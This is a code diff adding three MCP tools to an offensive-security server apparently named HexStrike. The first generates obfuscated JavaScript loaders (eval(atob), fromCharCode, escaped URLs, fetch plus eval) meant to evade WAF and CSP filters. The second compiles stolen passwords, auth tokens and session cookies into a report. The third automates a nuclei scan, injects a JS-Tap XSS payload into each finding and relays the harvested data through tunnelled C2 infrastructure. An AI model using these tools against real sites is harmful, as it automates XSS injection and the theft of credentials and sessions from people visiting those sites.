@@ -6286,6 +6286,228 @@ def setup_mcp_server(hexstrike_client: HexStrikeClient) -> FastMCP:
             ),
         }
 
+    # =========================================================================
+    # PAYLOAD OBFUSCATOR TOOLS
+    # =========================================================================
+
+    @mcp.tool()
+    def payload_obfuscate(
+        telemlib_url: str,
+        technique: str = "all",
+    ) -> Dict[str, Any]:
+        """
+        Generate obfuscated JS loaders for a telemlib.js URL to evade WAF/CSP.
+
+        All techniques load the same URL — only the syntactic surface changes.
+        Use the output in place of jstap_generate_payload when a WAF or
+        XSS filter is blocking the raw payload.
+
+        Techniques
+        ----------
+        base64_eval     eval(atob('B64'))        — hides all code from static scan
+        fromcharcode    String.fromCharCode(...) — zero string literals
+        hex_url         \\x hex-escaped URL       — breaks URL pattern matching
+        unicode_url     \\u unicode-escaped URL   — alternate string encoding
+        string_split    URL split into chunks    — breaks domain signatures
+        fetch_dynamic   fetch()+eval()           — avoids createElement (CSP)
+        all             Generate all six variants at once
+
+        Args:
+            telemlib_url: Full URL to telemlib.js (from jstap_generate_payload
+                          or jstap_server_status portal + '/telemlib.js')
+            technique:    One of the techniques above, or 'all'
+
+        Returns:
+            Dict of variants, each with js, script_tag, img_onerror, and note
+        """
+        data = {"telemlib_url": telemlib_url, "technique": technique}
+
+        logger.info(
+            f"{HexStrikeColors.ELECTRIC_PURPLE}🎭 Obfuscating payload "
+            f"[{technique}] for {telemlib_url}{HexStrikeColors.RESET}"
+        )
+        result = hexstrike_client.safe_post("api/tools/obfuscate/payload", data)
+
+        if result.get("success"):
+            count = len(result.get("variants", {}))
+            logger.info(
+                f"{HexStrikeColors.SUCCESS}✅ {count} obfuscated variant(s) generated"
+                f"{HexStrikeColors.RESET}"
+            )
+        else:
+            logger.error(
+                f"{HexStrikeColors.ERROR}❌ Obfuscation failed: "
+                f"{result.get('error')}{HexStrikeColors.RESET}"
+            )
+        return result
+
+    # =========================================================================
+    # ENGAGEMENT REPORTER TOOLS
+    # =========================================================================
+
+    @mcp.tool()
+    def engagement_report(
+        engagement_name: str = "HexStrike Engagement",
+        output_format: str = "markdown",
+        output_path: str = "",
+    ) -> Dict[str, Any]:
+        """
+        Generate a structured engagement report from the beacon loot cache.
+
+        Requires beacon_start to have been run first. Pulls all cached client
+        sessions and loot, then compiles into a professional report.
+
+        Report sections
+        ---------------
+        Executive Summary  — client count, loot volume, credential/token count
+        Credentials        — passwords/secrets from USERINPUT and FORMPOST events
+        Auth Tokens        — JWT/API keys from XHR/Fetch Authorization headers
+        Session Cookies    — all captured COOKIE events
+        URLs Visited       — URLVISITED timeline
+        Per-Client Detail  — full per-client breakdown
+
+        Args:
+            engagement_name: Name for the report header (e.g. 'ACME Corp Q1 2026')
+            output_format:   'markdown' or 'html'
+            output_path:     If set, write report to this file path and return path
+
+        Returns:
+            report text, client_count, total_loot, and optional saved_to path
+        """
+        data: Dict[str, Any] = {
+            "engagement_name": engagement_name,
+            "output_format": output_format,
+        }
+        if output_path:
+            data["output_path"] = output_path
+
+        logger.info(
+            f"{HexStrikeColors.NEON_BLUE}📋 Generating {output_format} engagement report: "
+            f"{engagement_name}{HexStrikeColors.RESET}"
+        )
+        result = hexstrike_client.safe_post("api/tools/report/engagement", data)
+
+        if result.get("success"):
+            saved = f" → {result['saved_to']}" if result.get("saved_to") else ""
+            logger.info(
+                f"{HexStrikeColors.SUCCESS}✅ Report generated | "
+                f"{result.get('client_count')} clients | "
+                f"{result.get('total_loot')} loot items{saved}{HexStrikeColors.RESET}"
+            )
+        else:
+            logger.error(
+                f"{HexStrikeColors.ERROR}❌ Report failed: "
+                f"{result.get('error')}{HexStrikeColors.RESET}"
+            )
+        return result
+
+    # =========================================================================
+    # NUCLEI → XSS PIPELINE TOOLS
+    # =========================================================================
+
+    @mcp.tool()
+    def nuclei_to_xss_chain(
+        target: str,
+        tunnel_provider: str = "auto",
+        tunnel_auth_token: str = "",
+        jstap_port: int = 8444,
+        jstap_username: str = "",
+        jstap_password: str = "",
+        beacon_interval: int = 10,
+        payload_mode: str = "trap",
+        obfuscate: bool = False,
+        obfuscation_technique: str = "base64_eval",
+        dry_run: bool = False,
+        max_chains: int = 3,
+    ) -> Dict[str, Any]:
+        """
+        Full automated pipeline: nuclei XSS scan → parse findings → inject → beacon.
+
+        Runs nuclei with XSS templates against the target, parses every
+        finding for injection vectors, then for each one:
+          - Starts JS-Tap C2 + tunnel (once, shared across all findings)
+          - Optionally obfuscates the telemlib.js loader
+          - Delivers the payload to the vulnerable parameter
+          - Starts beacon listener to collect incoming loot
+
+        Use dry_run=True first to see what nuclei finds before committing
+        to live injection.
+
+        Args:
+            target:               Target URL to scan (e.g. https://target.com)
+            tunnel_provider:      'auto', 'ngrok', 'cloudflared', 'serveo'
+            tunnel_auth_token:    ngrok auth token (optional)
+            jstap_port:           Local JS-Tap port (default 8444)
+            jstap_username:       JS-Tap portal username (for beacon listener)
+            jstap_password:       JS-Tap portal password (for beacon listener)
+            beacon_interval:      Beacon polling interval in seconds
+            payload_mode:         JS-Tap mode: 'trap' or 'implant'
+            obfuscate:            Apply payload obfuscation (default False)
+            obfuscation_technique: 'base64_eval', 'fromcharcode', 'hex_url',
+                                   'unicode_url', 'string_split', 'fetch_dynamic'
+            dry_run:              Scan only — do not inject (default False)
+            max_chains:           Max number of findings to inject (default 3)
+
+        Returns:
+            nuclei findings, injection results per vector, beacon status,
+            public C2 URL, confirmed reflection count, and next_steps
+        """
+        data: Dict[str, Any] = {
+            "target": target,
+            "tunnel_provider": tunnel_provider,
+            "jstap_port": jstap_port,
+            "beacon_interval": beacon_interval,
+            "payload_mode": payload_mode,
+            "obfuscate": obfuscate,
+            "obfuscation_technique": obfuscation_technique,
+            "dry_run": dry_run,
+            "max_chains": max_chains,
+        }
+        if tunnel_auth_token:
+            data["tunnel_auth_token"] = tunnel_auth_token
+        if jstap_username:
+            data["jstap_username"] = jstap_username
+        if jstap_password:
+            data["jstap_password"] = jstap_password
+
+        prefix = "[DRY RUN] " if dry_run else ""
+        logger.info(
+            f"{HexStrikeColors.HACKER_RED}⛓️  {prefix}Nuclei→XSS pipeline: "
+            f"{target}{HexStrikeColors.RESET}"
+        )
+        result = hexstrike_client.safe_post("api/tools/pipeline/nuclei-xss", data)
+
+        findings_count = result.get("findings_count", 0)
+        chains = result.get("chains", [])
+        confirmed = result.get("confirmed_reflections", 0)
+
+        if dry_run:
+            logger.info(
+                f"{HexStrikeColors.WARNING}🔍 Dry run: {findings_count} XSS vector(s) found "
+                f"— no injection performed{HexStrikeColors.RESET}"
+            )
+            for f in result.get("xss_findings", []):
+                logger.info(
+                    f"  [{f.get('severity','?').upper()}] {f.get('template_id')} "
+                    f"→ {f.get('target_url')} (param: {f.get('param')})"
+                )
+        elif findings_count == 0:
+            logger.info(
+                f"{HexStrikeColors.WARNING}⚠️  No XSS findings from nuclei on "
+                f"{target}{HexStrikeColors.RESET}"
+            )
+        else:
+            logger.info(
+                f"{HexStrikeColors.SUCCESS}✅ {confirmed}/{len(chains)} injections reflected "
+                f"| C2: {result.get('public_url', 'unknown')}{HexStrikeColors.RESET}"
+            )
+            if confirmed:
+                logger.info(
+                    f"{HexStrikeColors.HIGHLIGHT_RED} LIVE XSS — payload delivered and reflected {HexStrikeColors.RESET}"
+                )
+
+        return result
+
     return mcp
 
 def parse_args():
